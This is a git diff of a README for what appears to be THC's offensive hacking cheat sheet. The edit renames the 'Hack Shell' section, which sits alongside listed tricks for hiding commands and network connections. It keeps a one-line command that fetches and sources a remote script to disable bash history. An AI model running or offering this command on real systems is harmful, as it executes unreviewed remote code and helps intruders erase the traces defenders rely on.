@@ -11,7 +11,7 @@ We show the tricks 'as is' without any explanation why they work. You need to kn
 Got tricks? Join us on Telegram: [https://t.me/thcorg](https://t.me/thcorg)
 
 1. [Bash](#bash)
-   1. [Leave Bash without history](#bash-no-history)
+   1. [Set up a Hack Shell](#hackshell)
    1. [Hide your commands](#bash-hide-command)
    1. [Hide your command line options](#zap)
    1. [Hide a network connection](#bash-hide-connection)
@@ -114,10 +114,10 @@ Got tricks? Join us on Telegram: [https://t.me/thcorg](https://t.me/thcorg)
 ---
 <a id="bash"></a>
 ## 1. Bash / Shell
-<a id="bash-no-history"></a>
+<a id="hackshell"></a>
 **1.i. Set up a Hack Shell (bash):**
 
-Make BASH less noisy. Disables *~/.bash_history*, clears SSH_* and many other things.
+Make BASH less noisy. Disables *~/.bash_history* and [many other things](tools/hackshell.sh).
 ```sh
 source <(curl -SsfL https://thc.org/hs)
 ```
